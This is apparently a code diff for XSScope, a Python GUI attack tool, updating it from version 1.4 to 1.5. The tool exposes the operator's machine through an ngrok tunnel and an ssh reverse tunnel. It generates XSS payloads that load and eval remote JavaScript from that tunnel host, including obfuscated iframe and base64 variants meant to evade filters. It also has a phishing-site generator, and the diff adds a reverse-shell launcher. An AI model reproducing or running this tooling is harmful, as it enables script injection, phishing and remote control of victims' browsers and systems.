@@ -1,4 +1,5 @@
 import shutil
+import subprocess
 import webbrowser  # just for help to redirect to github project page
 from sys import platform  # avoid error(s) on unsupported commands
 import requests
@@ -19,10 +20,10 @@ import os
 from multiprocessing import Process
 
 #SETTING UP A NGROK
-with open('ngrok_authtoken.txt', 'r') as authtoken:
+with open('config/ngrok_authtoken.txt', 'r') as authtoken:
     ngrok_authtoken = authtoken.read()
-if ngrok_authtoken == "":
-    print("[!] Please enter Ngrok authtoken on /ngrok_authtoken.txt")
+if ngrok_authtoken == "paste_ngrok_authtoken_here":
+    tkinter.messagebox.showerror("Setup Error", "Because of the first setup, you have to paste your Ngrok Authtoken in /config/ngrok_authtoken.txt")
 
 # open a http tunnel on port 1337
 tcp_server = ngrok.connect(1337, "tcp")
@@ -474,8 +475,18 @@ myFunction()
     def quit5():
         tk.Toplevel().quit()
 
+    menubar_p = Menu(root1)
+    filemenu_p = Menu(menubar_p, tearoff=0)
+    filemenu_p.add_command(label="XSS Payloads", command=show_payload)
+    filemenu_p.add_separator()
+    filemenu_p.add_command(label="Quit", command=quit5)
+    menubar_p.add_cascade(label="Main", menu=filemenu_p)
+
+    root1.config(menu=menubar_p)
+    root1.mainloop()
+
 def check_update():
-    version_file = open('version.txt', mode='r')
+    version_file = open('config/version.txt', mode='r')
     old_version = float(version_file.read())
     version_file.close()
 
@@ -506,7 +517,7 @@ def check_update():
 
 def show_payload():
     root3 = tk.Toplevel()
-    root3.title("XSScope v.1.4 - All XSS Payloads")
+    root3.title("XSScope v.1.5 - All XSS Payloads")
     root3.geometry('750x580')
     #root3.iconbitmap('x_logo_VYw_icon.ico')
     root3.resizable(0, 0)
@@ -570,7 +581,7 @@ def show_payload():
     payload6 = '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + tcp_server + '/xsscope.js");a.send();</script>'
     payload7 = '<script>$.getScript("//' + tcp_server + '/xsscope.js")</script>'
     payload8 = "<iframe src=h" + cloudflare_bypass + "t" + cloudflare_bypass + "t" + cloudflare_bypass + "p" + cloudflare_bypass + ":" + cloudflare_bypass + "/" + cloudflare_bypass + "/" + cloudflare_bypass + list(tcp_server)[0] + cloudflare_bypass + list(tcp_server)[1] + cloudflare_bypass + list(tcp_server)[2] + cloudflare_bypass + list(tcp_server)[3] + cloudflare_bypass + list(tcp_server)[4] + cloudflare_bypass + list(tcp_server)[5] + cloudflare_bypass + list(tcp_server)[6] + cloudflare_bypass + list(tcp_server)[7] + cloudflare_bypass + list(tcp_server)[8] + cloudflare_bypass + list(tcp_server)[9] + cloudflare_bypass + list(tcp_server)[10] + cloudflare_bypass + list(tcp_server)[11] + cloudflare_bypass + list(tcp_server)[12] + cloudflare_bypass + list(tcp_server)[13] + cloudflare_bypass + list(tcp_server)[14] + cloudflare_bypass + list(tcp_server)[15] + cloudflare_bypass + list(tcp_server)[16] + cloudflare_bypass + list(tcp_server)[17] + cloudflare_bypass + list(tcp_server)[18] + cloudflare_bypass + list(tcp_server)[19] + cloudflare_bypass + "/" + cloudflare_bypass + "x" + cloudflare_bypass + "s" + cloudflare_bypass + "s" + cloudflare_bypass + "c" + cloudflare_bypass + "o" + cloudflare_bypass + "p" + cloudflare_bypass + "e" + cloudflare_bypass + "." + cloudflare_bypass + "j" + cloudflare_bypass + "s" + cloudflare_bypass + "></iframe>"
-    payload9 = '<!' + str(payload1)
+    payload9 = '">' + str(payload1)
     payload10_final = "<svg/onload=eval(atob('" + payload10 + "))>"
 
     #save to intruder file
@@ -702,7 +713,7 @@ def show_payload():
 
 def phishing_website():
     root4 = tk.Toplevel()
-    root4.title("XSScope v.1.4 - Phishing Website Generator")
+    root4.title("XSScope v.1.5 - Phishing Website Generator")
     root4.geometry('1000x1000')
     root4.resizable(0, 0)
     # root4.iconbitmap('x_logo_VYw_icon.ico')
@@ -712,7 +723,7 @@ def phishing_website():
 
     def show_payloads_html():
         root3_html = tk.Toplevel()
-        root3_html.title("XSScope v.1.4 - All XSS Payloads for generated HTML code")
+        root3_html.title("XSScope v.1.5 - All XSS Payloads for generated HTML code")
         root3_html.geometry('750x580')
         # root3_html.iconbitmap('x_logo_VYw_icon.ico')
         root3_html.resizable(0, 0)
@@ -784,7 +795,7 @@ def phishing_website():
                        16] + cloudflare_bypass + list(tcp_server)[17] + cloudflare_bypass + list(tcp_server)[
                        18] + cloudflare_bypass + list(tcp_server)[
                        19] + cloudflare_bypass + "/" + cloudflare_bypass + "c" + cloudflare_bypass + "u" + cloudflare_bypass + "s" + cloudflare_bypass + "t" + cloudflare_bypass + "o" + cloudflare_bypass + "m" + cloudflare_bypass + "." + cloudflare_bypass + "j" + cloudflare_bypass + "s" + cloudflare_bypass + "></iframe>"
-        payload9_html = '<!' + str(payload1_html)
+        payload9_html = '">' + str(payload1_html)
         payload10_final_html = "<svg/onload=eval(atob('" + payload10_html + "))>"
 
         # save to intruder file
@@ -1124,10 +1135,18 @@ def phishing_website():
     root4.config(menu=menubar2)
     root4.mainloop()
 
+def reverse_shell():
+    server_conf = open("config/tcpserver_domain.txt", "r")
+    if str(server_conf.read()) == "paste_.localhost_run_domain_here":
+        tkinter.messagebox.showinfo("First Setup Guidance", "This is your first setup, please copy the domain URL from terminal (Correct format: server-3457e3c8.localhost.run) and paste in on /config/tcpserver_domain.txt")
+    else:
+        os.system("gnome-terminal -- /bin/sh -c 'python3 reverse_shell.py; exec bash'")
+        os.system('''xfce4-terminal -e 'bash -c "python3 reverse_shell.py; bash"' -T "XSScope - Reverse Shell Panel"''')
+
 def main():
     #setting up the whole gui properties
     root = tk.Tk()
-    root.title("XSScope v.1.4")
+    root.title("XSScope v.1.5")
     root.geometry('410x100')
     #root.iconbitmap('x_logo_VYw_icon.ico')
     root.resizable(0,0)
@@ -1143,7 +1162,7 @@ def main():
     ngrok_server_text.grid(row=0, column=0)
 
     ngrok_server_output = tk.Entry(main_frame, width=30)
-    ngrok_server_output.insert(END, tcp_server_ip) #here you should add the NGROK ADDRESS
+    ngrok_server_output.insert(END, tcp_server_ip)
     ngrok_server_output.configure(state="readonly")
     ngrok_server_output.grid(row=0, column=1)
 
@@ -1180,7 +1199,7 @@ def main():
     filemenu = Menu(menubar, tearoff=0)
     filemenu.add_command(label="Agent Module", command=agent_module)
     filemenu.add_command(label="Add HTML code", command=phishing_website)
-    filemenu.add_command(label="XSS Payloads", command=show_payload)
+    filemenu.add_command(label="Reverse Shell", command=reverse_shell)
     filemenu.add_separator()
     filemenu.add_command(label="Check for update", command=check_update)
     filemenu.add_command(label="Exit", command=quit)
@@ -1198,11 +1217,17 @@ def main():
     root.mainloop()
 
 def php_server():
-    os.system('php -S localhost:1337')
+    os.system('php -S localhost:1337 >/dev/null')
+
+def tcp_server_setup():
+    os.system('ssh -R 80:localhost:1338 ssh.localhost.run')
 
 #starting the threads
-thread_2 = Process(target=php_server)
+thread_2=Process(target=tcp_server_setup)
 thread_2.start()
+
+thread_3=Process(target=php_server)
+thread_3.start()
 
 thread_1 = Process(target=main)
 thread_1.start()
@@ -1210,3 +1235,4 @@ thread_1.start()
 #closing threads
 thread_2.join()
 thread_1.join()
+thread_3.join()
